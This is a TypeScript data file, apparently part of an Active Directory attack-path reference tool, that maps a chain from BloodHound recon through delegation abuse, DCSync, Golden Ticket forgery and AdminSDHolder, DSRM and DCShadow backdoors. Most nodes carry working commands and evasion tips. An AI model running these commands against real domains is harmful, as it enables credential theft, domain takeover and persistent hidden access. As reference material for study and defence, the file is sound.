import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre } from '../lib';

/**
 * Chain 3: "Recon the privilege graph → escalate → DCSync → Golden Ticket →
 * Domain Admin → persistence". `domain-admin` is the convergent goal node,
 * reachable via ACL abuse, DCSync, or a forged Golden Ticket.
 */
export const domainDominanceNodes: TechniqueNodeDef[] = [
  {
    id: 'bloodhound-recon',
    label: 'Attack-Path Mapping',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Graph the domain to find the shortest path to Domain Admin.',
    description:
      'Collect the AD graph (users, groups, sessions, ACLs, delegations) and compute attack paths from owned principals to high-value targets, turning blind enumeration into a directed plan. SharpHound 2.x / bloodhound-ce-python collect the data, BloodHound CE analyses it, and PowerView / ldapdomaindump cover the same ground manually. Legacy bloodhound-python emits BloodHound 4.2/4.3 JSON that will not ingest into CE.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'SharpHound', url: 'https://github.com/SpecterOps/SharpHound' },
      { name: 'BloodHound CE', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'bloodhound-ce-python', url: 'https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get bloodhound', lang: 'bash' },
      {
        label: 'Collect from Linux (CE-compatible collector)',
        code: 'bloodhound-ce-python -d domain.local -u user -p pass -c All -ns 10.0.0.1',
        lang: 'bash',
      },
    ],
    requires: ['Any valid domain account'],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'HackTricks, Active Directory Methodology', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html' },
      { label: 'The Hacker Recipes, BloodHound', url: 'https://www.thehacker.recipes/ad/recon/bloodhound/' },
    ],
    opsec: 'Full collection generates heavy LDAP traffic and many session queries. Use stealth collection methods and avoid collecting every method at once in monitored environments.',
  },
  {
    id: 'find-privesc-path',
    label: 'Privilege Escalation',
    phase: 'priv-esc',
    kind: 'category',
    summary: 'Routes from a domain user to higher privilege.',
    description:
      'Every route from an ordinary domain account toward Domain Admin: ACL/DACL abuse, AD CS, Kerberos delegation, account/group manipulation, and critical CVEs. BloodHound usually identifies the shortest path.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      {
        label: 'Collect BloodHound CE data (bloodyAD: basics only; use SharpHound CE / RustHound-CE / nxc --bloodhound for full ADCS + delegation edges)',
        code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get bloodhound',
        lang: 'bash',
      },
    ],
  },
  {
    id: 'unconstrained-delegation',
    aliases: ['AbuseTGTDelegation', 'CoerceToTGT'],
    label: 'Unconstrained Delegation',
    phase: 'priv-esc',
    needs: 'local-admin',
    summary: 'Coerce a DC, capture its TGT.',
    description:
      'A host with unconstrained delegation stores the TGT of any user that authenticates to it. Coerce a Domain Controller to authenticate to a host you control (PetitPotam/PrinterBug), capture the DC\'s TGT, and impersonate it to compromise the domain. The TGT caches in the LSASS of the host that was authenticated to, so run the Rubeus monitor on the unconstrained host you already admin (SYSTEM-level) and coerce the DC to *that* host. Coercing to an arbitrary box caches nothing. To capture on a machine you do not control the delegation on (e.g. a Linux attack host), use krbrelayx instead of the local monitor.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
      { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
    ],
    commands: [
      { label: 'Find unconstrained-delegation hosts', code: "bloodyAD -u user -p pass -d domain.local --host dc01 get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName", lang: 'bash' },
      {
        label: 'Monitor for incoming TGTs',
        code: 'Rubeus.exe monitor /interval:5 /nowrap',
        lang: 'powershell',
      },
      {
        label: 'Coerce the DC to authenticate (-l = the unconstrained host where the TGT caches, or a krbrelayx listener)',
        code: 'coercer coerce -u user -p pass -t DC01 -l unconstrained_host',
        lang: 'bash',
      },
    ],
    requires: ['Admin on a host with unconstrained delegation', 'A coercion vector'],
    mitre: mitre('T1558'),
    opsec: 'Coercion (e.g. EfsRpc/PrinterBug) is increasingly detected and patched. Captured DC TGT enables Pass-the-Ticket as the DC.',
    references: [
      { label: 'HackTricks, Unconstrained Delegation', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html' },
      { label: 'leechristensen, SpoolSample (PrinterBug) original PoC', url: 'https://github.com/leechristensen/SpoolSample' },
      { label: 'topotam, PetitPotam original PoC (CVE-2021-36942)', url: 'https://github.com/topotam/PetitPotam' },
    ],
  },
  {
    id: 'dcsync',
    label: 'DCSync',
    phase: 'domain-dominance',
    needs: 'domain-admin',
    summary: 'Replicate secrets: pull any hash, incl. krbtgt.',
    description:
      'With replication rights (DS-Replication-Get-Changes) you can ask a DC to hand over password hashes for any principal (including krbtgt and Domain Admins) by impersonating a domain controller. No code runs on the DC.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add dcsync <attacker>', lang: 'bash' },
      {
        label: 'DCSync the krbtgt hash',
        code: 'secretsdump.py DOMAIN/user:pass@dc01 -just-dc-user krbtgt',
        lang: 'bash',
      },
      {
        label: 'Mimikatz DCSync',
        code: 'lsadump::dcsync /domain:domain.local /user:Administrator',
        lang: 'text',
      },
    ],
    requires: ['Replication rights (Domain Admin, DCSync ACL, or relayed LDAP)'],
    mitre: mitre('T1003.006'),
    opsec: 'Replication from a non-DC source is a high-fidelity detection (Event ID 4662 with the replication GUID). Source from an expected host if possible.',
    references: [
      { label: 'HackTricks, DCSync', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html' },
      { label: 'SpecterOps, BloodHound DCSync edge', url: 'https://bloodhound.specterops.io/resources/edges/dc-sync' },
      { label: 'gentilkiwi, Mimikatz (origin of lsadump::dcsync)', url: 'https://github.com/gentilkiwi/mimikatz' },
      { label: 'Sean Metcalf, Mimikatz DCSync writeup', url: 'https://adsecurity.org/?p=1729' },
    ],
  },
  {
    id: 'krbtgt-hash',
    label: 'krbtgt Hash',
    phase: 'domain-dominance',
    needs: 'domain-admin',
    summary: 'The key to forge any Kerberos ticket.',
    description:
      'The krbtgt account signs every TGT in the domain. Its hash lets you forge tickets for any user with any privileges, giving durable control of Kerberos auth.',
    requires: ['The krbtgt hash (via DCSync or NTDS.dit extraction)'],
    mitre: mitre('T1558'),
  },
  {
    id: 'golden-ticket',
    label: 'Golden Ticket',
    phase: 'domain-dominance',
    needs: 'domain-admin',
    summary: 'Forge a TGT as anyone, anytime.',
    description:
      'Using the krbtgt hash, forge a Ticket-Granting-Ticket with arbitrary group membership. On unpatched or legacy domains this works even for a non-existent user; on domains with PAC_REQUESTOR enforcement (KB5008380, default since Oct 2022) the target must be a real account and -user-id must match its RID. It is accepted across the domain and survives most password resets, giving Domain Admin equivalence and persistence.',
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Forge with the krbtgt RC4/NT hash (legacy; RC4 is loud on AES-only domains). -user-id must match the target RID (500 = Administrator) on PAC_REQUESTOR-enforcing DCs',
        code: 'ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local -user-id 500 Administrator',
        lang: 'bash',
      },
      {
        label: 'Forge with the krbtgt AES256 key (blends into an AES-only domain). -user-id must match the target RID (500 = Administrator) on PAC_REQUESTOR-enforcing DCs',
        code: 'ticketer.py -aesKey <krbtgt_aes256> -domain-sid <SID> -domain domain.local -user-id 500 Administrator',
        lang: 'bash',
      },
    ],
    requires: ['krbtgt RC4/NT hash or AES256 key', 'Domain SID'],
    mitre: mitre('T1558.001'),
    references: [
      { label: 'HackTricks, Golden Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html' },
      { label: 'The Hacker Recipes, Golden tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden' },
      { label: 'Microsoft, KB5008380 (PAC_REQUESTOR / CVE-2021-42287)', url: 'https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041' },
      { label: 'Sean Metcalf, Detecting Forged Kerberos Tickets (Golden and Silver)', url: 'https://adsecurity.org/?p=1515' },
    ],
    opsec: 'Match the forging key to the domain. On an AES-only domain a ticket built from the RC4 hash (etype 23) is an encryption-downgrade tell, so forge with -aesKey; on a legacy RC4 domain the NT hash is fine. Set realistic ticket lifetimes (default 10y golden tickets are an easy hunt); mismatched RID/encryption is detectable.',
  },
  {
    id: 'domain-admin',
    label: 'Domain Admin',
    phase: 'domain-dominance',
    kind: 'goal',
    summary: '👑 Full control of the domain.',
    description:
      'You hold Domain Admin (or equivalent): every host, every account, every secret. Reached by many routes, for example ACL abuse, DCSync, a forged Golden Ticket, certificate forgery or theft, KDC-bug impersonation (noPac, MS14-068), privileged-group abuse, or theft of a live DA account\'s credentials, tickets, or session. The remaining branches establish durable persistence so access survives remediation.',
    requires: ['A DA-equivalent takeover primitive: e.g. a DA-equivalent ACL, DCSync rights, a Golden Ticket, or any equivalent path to domain dominance'],
    mitre: mitre('T1078.002'),
  },
  {
    id: 'adminsdholder',
    aliases: ['ProtectAdminGroups'],
    label: 'AdminSDHolder Backdoor',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Stamp persistent rights on protected groups.',
    description:
      'The AdminSDHolder object\'s ACL is pushed to all protected groups every 60 minutes by SDProp. Add an ACE granting yourself control and it is silently re-applied to Domain Admins et al. even after a defender removes you.',
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'Impacket dacledit', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Add a persistent ACE to AdminSDHolder',
        code: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Rights All -PrincipalIdentity backdoor",
        lang: 'powershell',
      },
      {
        label: 'Grant GenericAll over AdminSDHolder (bloodyAD)',
        code: "bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' attacker",
        lang: 'bash',
      },
    ],
    requires: ['Domain Admin / write on AdminSDHolder'],
    mitre: mitre('T1098'),
    references: [
      { label: 'The Hacker Recipes, AdminSDHolder', url: 'https://www.thehacker.recipes/ad/persistence/adminsdholder' },
      { label: 'Sean Metcalf, Sneaky AD Persistence #15: AdminSDHolder and SDProp', url: 'https://adsecurity.org/?p=1906' },
    ],
    opsec: 'The injected ACE is visible to anyone auditing protected-group ACLs; pair with a low-profile principal name.',
  },
  {
    id: 'dsrm',
    label: 'DSRM Abuse',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Use the DC local admin as a backdoor.',
    description:
      'Every DC has a Directory Services Restore Mode local administrator. Dump its hash and flip the DsrmAdminLogonBehavior registry value so it can authenticate over the network: a stealthy, rarely-rotated DC backdoor. It is a local SAM account with no Kerberos identity, so authentication is NTLM pass-the-hash only (e.g. mimikatz sekurlsa::pth against the DC by short name or IP), never a TGT.',
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      {
        label: 'Allow DSRM network logon',
        code: 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2',
        lang: 'powershell',
      },
    ],
    requires: ['Domain Admin / local admin on a DC'],
    mitre: mitre('T1078.001'),
    references: [
      { label: 'HackTricks, DSRM Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dsrm-credentials.html' },
      { label: 'The Hacker Recipes, DSRM Persistence', url: 'https://www.thehacker.recipes/ad/persistence/dsrm' },
      { label: 'Sean Metcalf, Sneaky AD Persistence #13: DSRM Persistence v2', url: 'https://adsecurity.org/?p=1785' },
    ],
    opsec: 'Registry change on the DC is auditable; the DSRM account rarely logs on, so its use stands out if monitored.',
  },
  {
    id: 'dcshadow',
    label: 'DCShadow',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Register a rogue DC, push stealth changes.',
    description:
      'Temporarily register a rogue domain controller and push arbitrary directory changes (e.g. SIDHistory, ACLs) via replication. This evades tools that only watch object-modification events, but the changes are visible to replication-metadata monitoring, Directory Service events 4928/4929, and Defender for Identity.',
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      {
        label: 'Stage the change (SYSTEM instance; leave running)',
        code: 'lsadump::dcshadow /object:target /attribute:sidHistory /value:<DomainAdmins_or_EnterpriseAdmins_group_SID>',
        lang: 'text',
      },
      {
        label: 'Commit it (second instance, Domain Admin context)',
        code: 'lsadump::dcshadow /push',
        lang: 'text',
      },
    ],
    requires: ['Domain Admin', 'Two processes (push + SYSTEM)'],
    mitre: mitre('T1207'),
    references: [
      { label: 'HackTricks, DCShadow', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcshadow.html' },
      { label: 'The Hacker Recipes, DC Shadow', url: 'https://www.thehacker.recipes/ad/persistence/dcshadow/' },
      { label: 'Le Toux and Delpy, DCShadow official site (BlueHat IL 2018)', url: 'https://www.dcshadow.com/' },
    ],
    opsec: 'Stealthier than direct edits because changes arrive via replication, but registering an nTDSDSA object briefly is detectable by replication-metadata monitoring.',
  },
];

export const domainDominanceEdges: AttackEdge[] = [
  // Enumeration (BloodHound) and the privilege-escalation categories now hang
  // off valid-domain-creds directly (see ad-categories.ts). BloodHound no
  // longer gates escalation. Escalation techniques converge here:
  { source: 'unconstrained-delegation', target: 'pass-the-ticket', label: 'captured DC TGT' },
  { source: 'unconstrained-delegation', target: 'dcsync' },
  { source: 'dcsync', target: 'krbtgt-hash' },
  { source: 'dcsync', target: 'pass-the-hash', label: 'any account hash' },
  { source: 'dcsync', target: 'domain-admin', label: 'dump DA hash' },
  { source: 'krbtgt-hash', target: 'golden-ticket', description: 'Indicators this path applies: the krbtgt account NT hash or aes256 key is in hand; the domain SID (S-1-5-21-...) is known for the forging domain; ticketer or Rubeus is invoked with the krbtgt key to forge a TGT.' },
  { source: 'bloodhound-recon', target: 'find-privesc-path', label: 'pick a path' },
  { source: 'golden-ticket', target: 'domain-admin' },
  // domain-admin -> adminsdholder/dsrm/dcshadow now route through the
  // 'Persistence' category (see ad-categories.ts).
];
